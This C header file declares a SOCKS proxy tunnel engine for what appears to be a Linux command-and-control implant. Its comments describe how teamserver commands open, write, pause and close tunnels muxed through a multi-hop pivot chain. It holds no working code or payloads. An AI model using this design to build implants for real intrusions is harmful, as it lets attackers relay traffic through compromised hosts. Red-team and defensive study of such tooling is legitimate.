#ifndef PROXYFIRE_H
#define PROXYFIRE_H

#include "types.h"
#include "jobs.h"
#include "msgpack.h"
#include <stdint.h>

/// Proxyfire -- MUX tunnel engine for SOCKS proxy
///
/// Pattern: beacon's Proxyfire.cpp, adapted for Linux (syscalls/libc).
/// All tunnel I/O is muxed into the main communication channel so it
/// traverses any pivot chain (2, 3, 4+ hops).
///
/// Flow:
///   teamserver → COMMAND_TUNNEL_START → proxy_connect_tcp()
///   teamserver → COMMAND_TUNNEL_WRITE → proxy_write_tcp()
///   teamserver → COMMAND_TUNNEL_PAUSE → proxy_pause()
///   teamserver → COMMAND_TUNNEL_RESUME → proxy_resume()
///   teamserver → COMMAND_TUNNEL_STOP → proxy_close()
///   main loop  → process_tunnels()    → packs TUNNEL_STATUS/DATA/CLOSE into obj_collector

/// Start an async TCP connection to address (host:port).
/// The tunnel entry is allocated in g_job_ctx by the caller (task_tunnel_start).
/// Returns 0 on success (connection in progress), -1 on immediate error.
int proxy_connect_tcp(int tunnel_idx, const char *address);

/// Queue data from teamserver to be written to the target socket.
/// Data is buffered in tunnel_entry_t.write_buf and flushed by process_tunnels().
void proxy_write_tcp(int channel_id, const uint8_t *data, uint32_t len);

/// Pause reading from the target socket (teamserver backpressure).
void proxy_pause(int channel_id);

/// Resume reading from the target socket.
void proxy_resume(int channel_id);

/// Close a tunnel by channel_id.
void proxy_close(int channel_id);

/// Main loop polling function -- called every tick alongside process_pivots().
/// Performs 4 stages (beacon pattern):
///   1. CheckProxy  -- poll connecting sockets, pack TUNNEL_STATUS
///   2. FlushProxy  -- write buffered data to target sockets
///   3. RecvProxy   -- read from target sockets, pack TUNNEL_DATA
///   4. CloseProxy  -- cleanup closed tunnels, pack TUNNEL_CLOSE
/// Returns number of objects appended to obj_collector.
int process_tunnels(mp_writer_t *obj_collector);

#endif /* PROXYFIRE_H */
